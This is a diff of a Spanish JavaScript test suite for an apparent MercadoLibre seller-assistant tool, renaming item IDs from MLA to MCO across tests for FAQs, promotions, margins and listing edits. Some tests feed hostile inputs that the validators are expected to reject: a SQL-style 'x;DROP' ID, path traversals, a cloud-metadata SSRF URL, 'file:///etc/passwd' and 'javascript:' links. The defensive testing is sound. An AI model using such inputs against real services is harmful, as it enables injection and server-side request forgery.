     contiene(put.texto, 'Descripción original del producto.', 'PREGUNTAS FRECUENTES', '27 cm de alto', 'lavavajillas', '(Fin de preguntas frecuentes)');
@@ -805,19 +805,19 @@ async function pruebas() {
   await caso('faq: después de aplicar, Lucía ya no la marca y re-aplicar no duplica', async () => {
     await T.run({ accion: 'correr', trabajador: 'Lucía' });
     const r = await T.run({ accion: 'resultados', trabajador: 'Lucía' });
-    const filaMLA111 = r.split('\n').find((l) => l.startsWith('| MLA111'));
-    if (/no están en la descripción/.test(filaMLA111 || '')) throw new Error('Lucía la sigue marcando');
+    const filaMCO111 = r.split('\n').find((l) => l.startsWith('| MCO111'));
+    if (/no están en la descripción/.test(filaMCO111 || '')) throw new Error('Lucía la sigue marcando');
     descripcionesPut.length = 0;
-    contiene(await FAQ.run({ item_id: 'MLA111', aplicar: true }), 'ya cubierta');
+    contiene(await FAQ.run({ item_id: 'MCO111', aplicar: true }), 'ya cubierta');
     if (descripcionesPut.length) throw new Error('reescribió sin nada nuevo');
   });
   await caso('faq: una pregunta nueva se suma al bloque existente, sin perder las anteriores ni duplicarlo', async () => {
-    preguntasPorItem.MLA111.push({ id: 11, text: '¿Cuánto tiempo de garantía tiene?', status: 'ANSWERED', date_created: hace(1), answer: { text: 'Hola! 6 meses de garantía del vendedor. Saludos', date_created: hace(1) } });
-    contiene(await FAQ.run({ item_id: 'MLA111', aplicar: true }), '1 pregunta(s) nueva(s), 3 en total');
+    preguntasPorItem.MCO111.push({ id: 11, text: '¿Cuánto tiempo de garantía tiene?', status: 'ANSWERED', date_created: hace(1), answer: { text: 'Hola! 6 meses de garantía del vendedor. Saludos', date_created: hace(1) } });
+    contiene(await FAQ.run({ item_id: 'MCO111', aplicar: true }), '1 pregunta(s) nueva(s), 3 en total');
     const d = descripcionesPut.at(-1).texto;
     if (d.split('PREGUNTAS FRECUENTES').length !== 2) throw new Error('duplicó el bloque');
     contiene(d, '27 cm de alto', 'lavavajillas', '6 meses de garantía');
-    if (fq.armarDescripcion(d, fq.faltantes(preguntasPorItem.MLA111, d)) !== d) throw new Error('armar de nuevo cambió la descripción (no es idempotente)');
+    if (fq.armarDescripcion(d, fq.faltantes(preguntasPorItem.MCO111, d)) !== d) throw new Error('armar de nuevo cambió la descripción (no es idempotente)');
   });
   await caso('faq: valida item_id y respeta el límite de 50.000 caracteres de ML', async () => {
     contiene(await FAQ.run({ item_id: 'x;DROP' }), 'item_id inválido');
@@ -841,7 +841,7 @@ async function pruebas() {
   await caso('Clara: en su primer control ya pregunta por la invitación de ML y por la fecha que viene', async () => {
     const al = alertasClara();
     contiene(al, 'MercadoLibre te invitó a «Hot Sale»', 'inscripción hasta el', '1 publicación(es) tuyas pueden entrar', '¿Querés participar?', 'ref=P-HOT', '[agenda-comercial-ml]');
-    const prox = ag.fechasComerciales('MLA', { dias: 30 })[0];
+    const prox = ag.fechasComerciales('MCO', { dias: 30 })[0];
     if (prox) contiene(al, prox.nombre);
   });
   await caso('Clara: no repite el aviso si nada cambió', async () => {
@@ -851,11 +851,11 @@ async function pruebas() {
   await caso('Clara: calendario con lo que viene, ❓ pendientes, estimadas y refs para decidir', async () => {
     const t = await AG.run({ accion: 'calendario', dias: 120 });
     contiene(t, 'Agenda comercial', 'esperan tu decisión', '«Hot Sale»', 'inscripción hasta el', '❓ falta que decidas', 'ref=P-HOT', 'Black Friday', 'ref=black_friday:');
-    if (ag.fechasComerciales('MLA', { dias: 120 }).some((f) => f.estimada)) contiene(t, 'fecha estimada');
+    if (ag.fechasComerciales('MCO', { dias: 120 }).some((f) => f.estimada)) contiene(t, 'fecha estimada');
   });
   await caso('Clara: recuerda el cierre de inscripción mientras no decidas, y calla con un NO', async () => {
     promosML.push({ id: 'P-CYBER', name: 'CyberMonday MercadoLibre', type: 'MARKETPLACE_CAMPAIGN', status: 'candidate', start_date: enDias(12), finish_date: enDias(14), deadline_date: enDias(9) });
-    promoItems['P-CYBER'] = [{ id: 'MLA111', original_price: 42000, price: 37800, status: 'candidate' }, { id: 'MLA222', original_price: 30000, price: 27000, status: 'candidate' }];
+    promoItems['P-CYBER'] = [{ id: 'MCO111', original_price: 42000, price: 37800, status: 'candidate' }, { id: 'MCO222', original_price: 30000, price: 27000, status: 'candidate' }];
     let r = await tr.correrCiclo({ solo: ['agenda'], forzar: true });
     if (!r.alertas.some((a) => a.texto.includes('te invitó a «CyberMonday MercadoLibre»') && a.texto.includes('2 publicación(es)'))) throw new Error('no avisó la invitación nueva');
     promosML.at(-1).deadline_date = enDias(1); // pasan los días: cierra mañana
@@ -882,12 +882,12 @@ async function pruebas() {
   });
   await caso('Clara: cuando arranca un evento en el que participás, pide actualizar Mi página; cuando termina, sacar el banner', async () => {
     promosML[0].start_date = enDias(-0.5); promosML[0].finish_date = enDias(2); promosML[0].status = 'started';
-    promoItems['P-HOT'] = [{ id: 'MLA111', original_price: 42000, price: 37800, status: 'started' }];
+    promoItems['P-HOT'] = [{ id: 'MCO111', original_price: 42000, price: 37800, status: 'started' }];
     let r = await tr.correrCiclo({ solo: ['agenda'], forzar: true });
     const arr = r.alertas.find((a) => a.texto.includes('🚀 Arrancó «Hot Sale»'));
     if (!arr || arr.skill !== 'mi-pagina-ml' || !arr.texto.includes('hasta 10% OFF') || !arr.texto.includes('Mi página')) throw new Error('no avisó el arranque bien: ' + JSON.stringify(arr));
     const kit = await AG.run({ accion: 'pagina' });
-    contiene(kit, 'Kit para actualizar Mi página — Hot Sale', '"HOT SALE · HASTA 10% OFF"', 'MLA111', '$ 42.000 → $ 37.800', 'no tiene API pública', 'mi-pagina-ml');
+    contiene(kit, 'Kit para actualizar Mi página — Hot Sale', '"HOT SALE · HASTA 10% OFF"', 'MCO111', '$ 42.000 → $ 37.800', 'no tiene API pública', 'mi-pagina-ml');
     promosML.splice(0, 1); // la campaña terminó y ya no aparece
     r = await tr.correrCiclo({ solo: ['agenda'], forzar: true });
     if (!r.alertas.some((a) => a.texto.includes('🏁 Terminó «Hot Sale»') && a.skill === 'mi-pagina-ml')) throw new Error('no avisó que terminó');
@@ -900,7 +900,7 @@ async function pruebas() {
     if (!r.alertas.some((a) => a.texto.includes('Aniversario de la tienda') && a.texto.includes('¿Querés participar?'))) throw new Error('no preguntó por la fecha propia');
     const anio = new Date().getFullYear() + 1;
     contiene(await AG.run({ accion: 'fecha', ref: `hot_sale:${anio}`, fecha: `${anio}-05-17` }), 'confirmada');
-    const hs = ag.fechasComerciales('MLA', { dias: 400, confirmadas: tr.leerEquipo().agenda.confirmadas }).find((f) => f.clave === `hot_sale:${anio}`);
+    const hs = ag.fechasComerciales('MCO', { dias: 400, confirmadas: tr.leerEquipo().agenda.confirmadas }).find((f) => f.clave === `hot_sale:${anio}`);
     if (!hs || hs.estimada || hs.inicio.getDate() !== 17) throw new Error('no usó la fecha confirmada');
     contiene(await AG.run({ accion: 'decidir', ref: 'propia:aniversario-de-la-tienda', participar: true }), 'participás');
   });
@@ -921,22 +921,22 @@ async function pruebas() {
   await caso('Ramiro: sin costos cargados no inventa — pide cargarlos', async () => {
     await tr.correrCiclo({ solo: ['rentabilidad'], forzar: true });
     const t = hist('rentabilidad'); // ya avisó en su primer control (y no repite en la semana)
-    contiene(t, 'no tienen costo cargado', 'MLA222', 'MLA333', 'ml_cerebro', '[cerebro-ml]', '[tienda TIENDA_DEMO]');
+    contiene(t, 'no tienen costo cargado', 'MCO222', 'MCO333', 'ml_cerebro', '[cerebro-ml]', '[tienda TIENDA_DEMO]');
   });
   await caso('Ramiro: con costos calcula margen real (comisión + ads + impuestos) y avisa la PÉRDIDA', async () => {
-    await CER.run({ accion: 'guardar', item_id: 'MLA111', costo: 40000 });
-    await CER.run({ accion: 'guardar', item_id: 'MLA222', costo: 9000 });
-    await CER.run({ accion: 'guardar', item_id: 'MLA333', costo: 15000 });
+    await CER.run({ accion: 'guardar', item_id: 'MCO111', costo: 40000 });
+    await CER.run({ accion: 'guardar', item_id: 'MCO222', costo: 9000 });
+    await CER.run({ accion: 'guardar', item_id: 'MCO333', costo: 15000 });
     await CER.run({ accion: 'guardar', impuestos_pct: 10 });
     const r = await tr.correrCiclo({ solo: ['rentabilidad'], forzar: true });
-    contiene(deTrab('rentabilidad', r), '💸 MLA111', 'te hace PERDER', 'la publicidad se lleva', '[calculadora-ml]');
+    contiene(deTrab('rentabilidad', r), '💸 MCO111', 'te hace PERDER', 'la publicidad se lleva', '[calculadora-ml]');
     const res = await T.run({ accion: 'resultados', trabajador: 'Ramiro' });
-    contiene(res, 'Analista de rentabilidad', 'MLA111', '🔴', 'Ganancia por unidad', 'con PÉRDIDA');
+    contiene(res, 'Analista de rentabilidad', 'MCO111', '🔴', 'Ganancia por unidad', 'con PÉRDIDA');
     // 42000 − 14% (5880) − ads 15000/10 (1500) − 10% imp (4200) − costo 40000 = −9580
     contiene(res, '$ -9.580');
   });
   await caso('Ana: resumen de la semana, campaña que gasta sin vender y ACOS arriba de lo que aguanta el margen (cruce con Ramiro)', async () => {
-    await CER.run({ accion: 'guardar', item_id: 'MLA111', costo: 30000 });
+    await CER.run({ accion: 'guardar', item_id: 'MCO111', costo: 30000 });
     await tr.correrCiclo({ solo: ['rentabilidad'], forzar: true }); // margen chico: aguanta poco ACOS
     let r = await tr.correrCiclo({ solo: ['anuncios'], forzar: true });
     contiene(deTrab('anuncios', r), 'ACOS 12.5%', 'tu margen aguanta hasta', '[publicidad-ml]');
@@ -1014,10 +1014,10 @@ async function pruebas() {
     const mj = await import('../src/mejorador.js');
     const hace = (d) => new Date(Date.now() - d * 86400000).toISOString();
     const B = `http://localhost:${PUERTO}/fotos/`;
-    mercado.items = { ...(mercado.items || {}), MLA700: { title: 'Termo Acero Inoxidable 1 Litro Negro', video_id: null,
+    mercado.items = { ...(mercado.items || {}), MCO700: { title: 'Termo Acero Inoxidable 1 Litro Negro', video_id: null,
       pictures: [{ secure_url: B + '1.jpg' }, { secure_url: B + 'no-imagen' }, { secure_url: 'https://evil.example.com/x.jpg' }, { secure_url: 'http://169.254.169.254/latest/meta-data' }],
       attributes: [{ id: 'HEIGHT', name: 'Altura', value_name: '27 cm' }, { id: 'WEIGHT', name: 'Peso', value_name: '480 g' }, { id: 'MATERIAL', name: 'Material', value_name: 'Acero inoxidable' }, { id: 'BRAND', name: 'Marca', value_name: 'Lumi' }, { id: 'SELLER_SKU', value_name: 'TER-1L' }] } };
-    descripciones.MLA700 = 'Hola! Bienvenidos a nuestra tienda, gracias por visitarnos.\nTermo de acero de muy buena calidad que mantiene el agua caliente todo el día.\nEnvío en el día.';
+    descripciones.MCO700 = 'Hola! Bienvenidos a nuestra tienda, gracias por visitarnos.\nTermo de acero de muy buena calidad que mantiene el agua caliente todo el día.\nEnvío en el día.';
     const qs = [];
     for (let i = 0; i < 24; i++) qs.push({ id: i, status: 'ANSWERED', date_created: hace(1 + i * 3), text: `¿Es apto para zona${i}a zona${i}b zona${i}c?`, answer: { text: `Hola! Sí, es apto para zona${i}a. Saludos`, date_created: hace(1 + i * 3) } });
     qs.push({ id: 90, status: 'ANSWERED', date_created: hace(100), text: '¿Viejisima pregunta muyvieja totalmentevieja?', answer: { text: 'Respuesta vieja.', date_created: hace(100) } });
@@ -1025,7 +1025,7 @@ async function pruebas() {
     qs.push({ id: 92, status: 'ANSWERED', date_created: hace(3), text: '¿Tenés stock?', answer: { text: 'Sí, hay stock.', date_created: hace(3) } });
     qs.push({ id: 93, status: 'ANSWERED', date_created: hace(4), text: '¿Hacen precio por mayor raro?', answer: { text: 'Escribime al 11 5555 5555', date_created: hace(4) } });
     qs.sort((a, b) => Date.parse(b.date_created) - Date.parse(a.date_created));
-    preguntasPorItem.MLA700 = qs;
+    preguntasPorItem.MCO700 = qs;
     // URLs de fotos: solo el CDN de ML por https
     for (const [u, ok] of [['https://http2.mlstatic.com/D_NQ_x-O.jpg', true], ['https://mlstatic.com.evil.com/x.jpg', false], ['https://user:pw@http2.mlstatic.com/x.jpg', false], ['http://http2.mlstatic.com/x.jpg', false], ['file:///etc/passwd', false], ['javascript:alert(1)', false]])
       if (!!mj.urlFotoValida(u) !== ok) throw new Error('urlFotoValida(' + u + ') debería ser ' + ok);
@@ -1033,17 +1033,17 @@ async function pruebas() {
     const rd = mj.revisarDescripcion('Termo de acero 1 litro.\nViene con tapón cebador.\nIdeal para el mate.\nMedidas: 27 cm de alto\nCaracterísticas\n- Acero\n- Negro\n📦 Qué viene en la caja\n- 1 termo', 'Termo acero');
     if (rd.resumen.length !== 3 || rd.secciones.medidas !== 3 || rd.secciones.incluye !== 7 || !rd.ok) throw new Error('reconoció mal las secciones: ' + JSON.stringify(rd));
     // Revisión
-    const r = await tool('ml_mejorar_publicacion').run({ item_id: 'mla700' });
+    const r = await tool('ml_mejorar_publicacion').run({ item_id: 'mco700' });
     if (typeof r !== 'object' || !Array.isArray(r.imagenes)) throw new Error('no devolvió fotos para mirar');
     if (r.imagenes.length !== 1 || r.imagenes[0].mimeType !== 'image/jpeg') throw new Error('trajo fotos que no tenía que traer: ' + r.imagenes.length);
     contiene(r.texto, 'Medidas en las fotos', 'te muestro 1 de 4 foto(s)', 'Altura: 27 cm', '🎬 **Video:** ❌', 'arranca con un saludo', 'falta la sección MEDIDAS', 'falta la sección CARACTERÍSTICAS', 'falta la sección QUÉ VIENE EN LA CAJA',
-      'Preguntas de los últimos 90 días:** 27', '**1 sin responder**', 'FAQ de 20 pregunta(s)', 'FAQ propuesto (20 preguntas', '20. **', 'Material: Acero inoxidable', 'ml_aplicar_mejora item_id=MLA700', 'skill imagenes-ml');
+      'Preguntas de los últimos 90 días:** 27', '**1 sin responder**', 'FAQ de 20 pregunta(s)', 'FAQ propuesto (20 preguntas', '20. **', 'Material: Acero inoxidable', 'ml_aplicar_mejora item_id=MCO700', 'skill imagenes-ml');
     if (r.texto.includes('Viejisima') || r.texto.includes('5555') || r.texto.includes('¿Tenés stock?')) throw new Error('metió en el FAQ algo viejo, con contacto o de stock');
-    contiene((await tool('ml_mejorar_publicacion').run({ item_id: 'MLA111', fotos: false })).texto, '🎬 **Video:** ✅');
+    contiene((await tool('ml_mejorar_publicacion').run({ item_id: 'MCO111', fotos: false })).texto, '🎬 **Video:** ✅');
     contiene(await tool('ml_mejorar_publicacion').run({ item_id: '../etc' }), 'item_id inválido');
     // Aplicar: validaciones
     const AP = tool('ml_aplicar_mejora');
-    const base = { item_id: 'MLA700', resumen: ['Termo de acero inoxidable de 1 litro, negro.', 'Mantiene el mate caliente todo el día.', 'Mide 27 cm de alto y pesa 480 g.', 'Viene con tapón cebador.'], medidas: ['Alto: 27 cm', 'Peso: 480 g'], caracteristicas: ['Material: acero inoxidable', 'Marca: Lumi', 'Doble pared'], incluye: ['1 termo', '1 tapón cebador'] };
+    const base = { item_id: 'MCO700', resumen: ['Termo de acero inoxidable de 1 litro, negro.', 'Mantiene el mate caliente todo el día.', 'Mide 27 cm de alto y pesa 480 g.', 'Viene con tapón cebador.'], medidas: ['Alto: 27 cm', 'Peso: 480 g'], caracteristicas: ['Material: acero inoxidable', 'Marca: Lumi', 'Doble pared'], incluye: ['1 termo', '1 tapón cebador'] };
     for (const [cambio, motivo] of [[{ resumen: ['Uno', 'Dos'] }, 'al menos 3'], [{ resumen: ['1', '2', '3', '4', '5', '6'] }, 'máximo 5'], [{ medidas: ['Bastante alto'] }, 'medida con número'], [{ caracteristicas: ['Escribinos por WhatsApp', 'Doble pared'] }, 'datos de contacto'], [{ incluye: ['<b>termo</b>'] }, 'HTML'], [{ caracteristicas: ['visitá www.mitienda.com', 'x'] }, 'datos de contacto']]) {
       contiene(await AP.run({ ...base, ...cambio }), 'No la armé', motivo);
     }
@@ -1051,10 +1051,10 @@ async function pruebas() {
     const prev = await AP.run(base);
     contiene(prev, 'Así quedaría', 'MEDIDAS\n- Alto: 27 cm', 'CARACTERÍSTICAS PRINCIPALES\n- Material: acero inoxidable', 'QUÉ VIENE EN LA CAJA\n- 1 termo', 'PREGUNTAS FRECUENTES', '✅ resumen', '✅ orden', '20 preguntas frecuentes', 'No toqué nada');
     if (descripcionesPut.length !== putsAntes) throw new Error('escribió sin confirmar');
-    const vieja = descripciones.MLA700;
+    const vieja = descripciones.MCO700;
     const ok = await AP.run({ ...base, confirmar: true });
     contiene(ok, 'Descripción mejorada en 1 publicación(es)', '20 preguntas frecuentes', 'respaldo en');
-    const nueva = descripciones.MLA700, ls = nueva.split('\n');
+    const nueva = descripciones.MCO700, ls = nueva.split('\n');
     if (ls[0] !== base.resumen[0] || ls.slice(0, 5).some((l) => /^(MEDIDAS|CARACTER)/.test(l))) throw new Error('los 5 primeros renglones no son el resumen');
     const i = (t) => nueva.indexOf(t);
     if (!(i('MEDIDAS') < i('CARACTERÍSTICAS PRINCIPALES') && i('CARACTERÍSTICAS PRINCIPALES') < i('QUÉ VIENE EN LA CAJA') && i('QUÉ VIENE EN LA CAJA') < i('PREGUNTAS FRECUENTES'))) throw new Error('orden equivocado');
@@ -1065,7 +1065,7 @@ async function pruebas() {
     if (process.platform !== 'win32' && (fs.statSync(resp).mode & 0o077)) throw new Error('el respaldo no es privado');
     // Aplicarla otra vez no duplica el FAQ
     await AP.run({ ...base, confirmar: true });
-    if ((descripciones.MLA700.match(/PREGUNTAS FRECUENTES/g) || []).length !== 1 || (descripciones.MLA700.match(/^¿/gm) || []).length !== 20) throw new Error('duplicó el FAQ al aplicar dos veces');
+    if ((descripciones.MCO700.match(/PREGUNTAS FRECUENTES/g) || []).length !== 1 || (descripciones.MCO700.match(/^¿/gm) || []).length !== 20) throw new Error('duplicó el FAQ al aplicar dos veces');
     // Lucía marca las descripciones sin la estructura
     const au = await import('../src/auditoria.js');
     const ev = au.evaluar({ b: { title: 'Termo Acero 1 Litro', pictures: [], attributes: [] }, desc: vieja + '\n' + 'Texto largo. '.repeat(20) });
@@ -1076,40 +1076,40 @@ async function pruebas() {
     const hace = (d) => new Date(Date.now() - d * 86400000).toISOString();
     const sku = [{ id: 'SELLER_SKU', value_name: 'TER-1L' }];
     mercado.items = { ...(mercado.items || {}),
-      MLA710: { seller_id: 777, title: 'Termo Acero 1 Litro Negro', attributes: sku, pictures: [] },
-      MLA711: { seller_id: 777, title: 'Otro producto', attributes: [{ id: 'SELLER_SKU', value_name: 'TER-1L-PACK' }], pictures: [] },
-      MLA810: { seller_id: 888, title: 'Termo Acero 1 Litro Negro (tienda dos)', attributes: sku, pictures: [], video_id: 'v1' },
-      MLA811: { seller_id: 888, title: 'Mate de la tienda dos', attributes: [], pictures: [] },
-      MLA999999: { seller_id: 123456, title: 'Termo de un rival', attributes: sku, pictures: [] } };
-    porSkuDeTienda[777] = { 'TER-1L': ['MLA710', 'MLA711'] }; porSkuDeTienda[888] = { 'TER-1L': ['MLA810'] };
-    descripciones.MLA810 = 'Descripción vieja de la tienda dos.';
-    preguntasPorItem.MLA810 = [{ id: 1, status: 'ANSWERED', date_created: hace(2), text: '¿Es apto para camping montaña?', answer: { text: 'Sí, ideal para camping.', date_created: hace(2) } }];
+      MCO710: { seller_id: 777, title: 'Termo Acero 1 Litro Negro', attributes: sku, pictures: [] },
+      MCO711: { seller_id: 777, title: 'Otro producto', attributes: [{ id: 'SELLER_SKU', value_name: 'TER-1L-PACK' }], pictures: [] },
+      MCO810: { seller_id: 888, title: 'Termo Acero 1 Litro Negro (tienda dos)', attributes: sku, pictures: [], video_id: 'v1' },
+      MCO811: { seller_id: 888, title: 'Mate de la tienda dos', attributes: [], pictures: [] },
+      MCO999999: { seller_id: 123456, title: 'Termo de un rival', attributes: sku, pictures: [] } };
+    porSkuDeTienda[777] = { 'TER-1L': ['MCO710', 'MCO711'] }; porSkuDeTienda[888] = { 'TER-1L': ['MCO810'] };
+    descripciones.MCO810 = 'Descripción vieja de la tienda dos.';
+    preguntasPorItem.MCO810 = [{ id: 1, status: 'ANSWERED', date_created: hace(2), text: '¿Es apto para camping montaña?', answer: { text: 'Sí, ideal para camping.', date_created: hace(2) } }];
     // Revisión de una publicación de la SEGUNDA tienda sin decir la cuenta
-    const r = await tool('ml_mejorar_publicacion').run({ item_id: 'MLA810', fotos: false });
-    contiene(r.texto, '🏪 Tienda **TIENDA_DOS**', 'SKU TER-1L', 'El mismo producto en tus otras publicaciones', 'MLA710 en **TIENDA_DEMO**', 'mismo_sku=true', '🎬 **Video:** ✅');
-    if (r.texto.includes('MLA711')) throw new Error('mezcló un SKU parecido pero distinto');
+    const r = await tool('ml_mejorar_publicacion').run({ item_id: 'MCO810', fotos: false });
+    contiene(r.texto, '🏪 Tienda **TIENDA_DOS**', 'SKU TER-1L', 'El mismo producto en tus otras publicaciones', 'MCO710 en **TIENDA_DEMO**', 'mismo_sku=true', '🎬 **Video:** ✅');
+    if (r.texto.includes('MCO711')) throw new Error('mezcló un SKU parecido pero distinto');
     // Publicación ajena: se puede mirar, no aplicar
-    contiene((await tool('ml_mejorar_publicacion').run({ item_id: 'MLA999999', fotos: false })).texto, 'no es de tus tiendas conectadas');
+    contiene((await tool('ml_mejorar_publicacion').run({ item_id: 'MCO999999', fotos: false })).texto, 'no es de tus tiendas conectadas');
     const AP = tool('ml_aplicar_mejora');
     const base = { resumen: ['Termo de acero de 1 litro.', 'Mantiene el agua caliente 24 horas.', 'Mide 27 cm de alto.'], medidas: ['Alto: 27 cm'], caracteristicas: ['Acero inoxidable', 'Doble pared'], incluye: ['1 termo'] };
-    contiene(await AP.run({ ...base, item_id: 'MLA999999', confirmar: true }), 'no es de ninguna de tus tiendas');
-    contiene(await AP.run({ ...base, item_id: 'MLA811', mismo_sku: true }), 'no tiene SKU');
+    contiene(await AP.run({ ...base, item_id: 'MCO999999', confirmar: true }), 'no es de ninguna de tus tiendas');
+    contiene(await AP.run({ ...base, item_id: 'MCO811', mismo_sku: true }), 'no tiene SKU');
     // Vista previa con mismo SKU: muestra las dos tiendas y no escribe
     const puts = descripcionesPut.length;
-    const prev = await AP.run({ ...base, item_id: 'MLA710', mismo_sku: true });
-    contiene(prev, 'MLA710 (TIENDA_DEMO)', 'También se aplicaría en 1 publicación(es) con el SKU TER-1L', 'MLA810 (TIENDA_DOS)', 'con 1 preguntas frecuentes de SUS compradores', 'mismo_sku=true confirmar=true');
+    const prev = await AP.run({ ...base, item_id: 'MCO710', mismo_sku: true });
+    contiene(prev, 'MCO710 (TIENDA_DEMO)', 'También se aplicaría en 1 publicación(es) con el SKU TER-1L', 'MCO810 (TIENDA_DOS)', 'con 1 preguntas frecuentes de SUS compradores', 'mismo_sku=true confirmar=true');
     if (descripcionesPut.length !== puts) throw new Error('escribió sin confirmar');
-    const ok = await AP.run({ ...base, item_id: 'MLA710', mismo_sku: true, confirmar: true });
-    contiene(ok, 'mejorada en 2 publicación(es)', '**MLA710 (TIENDA_DEMO)**', '**MLA810 (TIENDA_DOS)**');
+    const ok = await AP.run({ ...base, item_id: 'MCO710', mismo_sku: true, confirmar: true });
+    contiene(ok, 'mejorada en 2 publicación(es)', '**MCO710 (TIENDA_DEMO)**', '**MCO810 (TIENDA_DOS)**');
     const escritas = descripcionesPut.slice(puts).map((x) => x.id).sort();
-    if (escritas.join() !== 'MLA710,MLA810') throw new Error('escribió en: ' + escritas);
-    if (!descripciones.MLA810.includes('¿Es apto para camping montaña?') || descripciones.MLA710.includes('camping')) throw new Error('el FAQ no es el de las preguntas de cada publicación');
-    if (!descripciones.MLA810.startsWith('Termo de acero de 1 litro.')) throw new Error('no aplicó la estructura en la otra tienda');
+    if (escritas.join() !== 'MCO710,MCO810') throw new Error('escribió en: ' + escritas);
+    if (!descripciones.MCO810.includes('¿Es apto para camping montaña?') || descripciones.MCO710.includes('camping')) throw new Error('el FAQ no es el de las preguntas de cada publicación');
+    if (!descripciones.MCO810.startsWith('Termo de acero de 1 litro.')) throw new Error('no aplicó la estructura en la otra tienda');
     // Barrido de todas las tiendas
-    const antes = itemsPorEstado.active; itemsPorEstado.active = ['MLA700', 'MLA710']; activos888 = ['MLA810', 'MLA811'];
+    const antes = itemsPorEstado.active; itemsPorEstado.active = ['MCO700', 'MCO710']; activos888 = ['MCO810', 'MCO811'];
     try {
       const bar = await tool('ml_mejorar_publicacion').run({});
-      contiene(bar, 'barrido de 2 tienda(s)', '🏪 TIENDA_DEMO — 2 publicación(es)', '🏪 TIENDA_DOS — 2 publicación(es)', '| Publicación | Resumen (5 renglones)', 'MLA811', 'El mismo producto en varias tiendas', '**TER-1L**: ', 'MLA810 (TIENDA_DOS)', 'medidas en las fotos');
+      contiene(bar, 'barrido de 2 tienda(s)', '🏪 TIENDA_DEMO — 2 publicación(es)', '🏪 TIENDA_DOS — 2 publicación(es)', '| Publicación | Resumen (5 renglones)', 'MCO811', 'El mismo producto en varias tiendas', '**TER-1L**: ', 'MCO810 (TIENDA_DOS)', 'medidas en las fotos');
       const solo = await tool('ml_mejorar_publicacion').run({ cuenta: '888' });
       contiene(solo, 'barrido de 1 tienda(s)', 'TIENDA_DOS'); if (solo.includes('TIENDA_DEMO —')) throw new Error('barrió una tienda que no se pidió');
       contiene(await tool('ml_mejorar_publicacion').run({ cuenta: '555' }), 'no está conectada');
@@ -1129,16 +1129,16 @@ async function pruebas() {
       if (total != null) mercado.visitasTotal[id] = total;
     };
     // A: organizador de cocina — repartido entre 8 vendedores, 2 nuevos que ya venden, visitas parejas
-    for (let v = 1; v <= 8; v++) for (let k = 0; k < 2; k++) alta('organizador de cocina', `MLA5${v}${k}`, { vendedor: 100 + v, precio: 9000 + v * 300, vendidos: 600 + v * 40, edad: 300, visitas: () => 100, total: 30000 });
-    alta('organizador de cocina', 'MLA5901', { vendedor: 201, precio: 9500, vendidos: 150, edad: 45, visitas: () => 120, total: 5400 });
-    alta('organizador de cocina', 'MLA5902', { vendedor: 202, precio: 9900, vendidos: 60, edad: 70, visitas: () => 80, total: 5600 });
+    for (let v = 1; v <= 8; v++) for (let k = 0; k < 2; k++) alta('organizador de cocina', `MCO5${v}${k}`, { vendedor: 100 + v, precio: 9000 + v * 300, vendidos: 600 + v * 40, edad: 300, visitas: () => 100, total: 30000 });
+    alta('organizador de cocina', 'MCO5901', { vendedor: 201, precio: 9500, vendidos: 150, edad: 45, visitas: () => 120, total: 5400 });
+    alta('organizador de cocina', 'MCO5902', { vendedor: 202, precio: 9900, vendidos: 60, edad: 70, visitas: () => 80, total: 5600 });
     // B: cargador — un vendedor se lleva casi todo, visitas cayendo, publicaciones viejas que vendieron en el pasado
-    alta('cargador celular', 'MLA6001', { vendedor: 300, oficial: true, precio: 15000, vendidos: 50000, edad: 1100, visitas: (d) => (d < 30 ? 60 : 200), total: 900000 });
-    alta('cargador celular', 'MLA6002', { vendedor: 300, precio: 15500, vendidos: 30000, edad: 1000, visitas: (d) => (d < 30 ? 50 : 180), total: 700000 });
-    alta('cargador celular', 'MLA6003', { vendedor: 300, precio: 14000, vendidos: 20000, edad: 900, visitas: (d) => (d < 30 ? 40 : 150), total: 600000 });
-    alta('cargador celular', 'MLA6004', { vendedor: 301, precio: 16000, vendidos: 200, edad: 400, visitas: () => 5, total: 2000 });
+    alta('cargador celular', 'MCO6001', { vendedor: 300, oficial: true, precio: 15000, vendidos: 50000, edad: 1100, visitas: (d) => (d < 30 ? 60 : 200), total: 900000 });
+    alta('cargador celular', 'MCO6002', { vendedor: 300, precio: 15500, vendidos: 30000, edad: 1000, visitas: (d) => (d < 30 ? 50 : 180), total: 700000 });
+    alta('cargador celular', 'MCO6003', { vendedor: 300, precio: 14000, vendidos: 20000, edad: 900, visitas: (d) => (d < 30 ? 40 : 150), total: 600000 });
+    alta('cargador celular', 'MCO6004', { vendedor: 301, precio: 16000, vendidos: 200, edad: 400, visitas: () => 5, total: 2000 });
     // C: ventilador de pie — estacional
-    for (let v = 1; v <= 4; v++) alta('ventilador de pie', `MLA70${v}`, { vendedor: 400 + v, precio: 60000, vendidos: 300, edad: 365, visitas: () => 50, total: 20000 });
+    for (let v = 1; v <= 4; v++) alta('ventilador de pie', `MCO70${v}`, { vendedor: 400 + v, precio: 60000, vendidos: 300, edad: 365, visitas: () => 50, total: 20000 });
     const N = tool('ml_nichos');
     // Detalle de un nicho con costo
     const t = await N.run({ busqueda: 'organizador de cocina', costo: 3000 });
@@ -1158,13 +1158,13 @@ async function pruebas() {
     contiene(r, 'Ranking de oportunidades — 3 nichos', '| 1 | organizador de cocina |', 'arrancó hace 45 días');
     if (r.indexOf('| 1 | organizador de cocina') > r.indexOf('cargador celular |')) throw new Error('el ranking no ordenó por puntaje');
     // Por categoría y validaciones
-    mercado.nichos['cat:MLA5000'] = mercado.nichos['organizador de cocina'];
-    contiene(await N.run({ categoria: 'mla5000' }), 'Nicho: «Organización de cocina»');
+    mercado.nichos['cat:MCO5000'] = mercado.nichos['organizador de cocina'];
+    contiene(await N.run({ categoria: 'mco5000' }), 'Nicho: «Organización de cocina»');
     contiene(await N.run({}), 'Decime qué nicho analizar');
     contiene(await N.run({ categoria: '../x' }), 'categoria inválida');
-    contiene(await N.run({ busqueda: 'x', sitio: 'MLA/../../users' }), 'sitio inválido');
+    contiene(await N.run({ busqueda: 'x', sitio: 'MCO/../../users' }), 'sitio inválido');
     // Sin ventas informadas: no inventa la rotación
-    alta('sin datos', 'MLA8001', { vendedor: 1, precio: 100, vendidos: 0, edad: 10 }); mercado.items.MLA8001 = {};
+    alta('sin datos', 'MCO8001', { vendedor: 1, precio: 100, vendidos: 0, edad: 10 }); mercado.items.MCO8001 = {};
     contiene(await N.run({ busqueda: 'sin datos' }), 'no informa ventas');
   });
 
@@ -1201,7 +1201,7 @@ async function pruebas() {
     // Sin tareas propias ni búsquedas seguidas: explora las tendencias del sitio
     const tend = mercado.tendencias; mercado.tendencias = [{ keyword: 'organizador de cocina' }, { keyword: 'cargador celular' }];
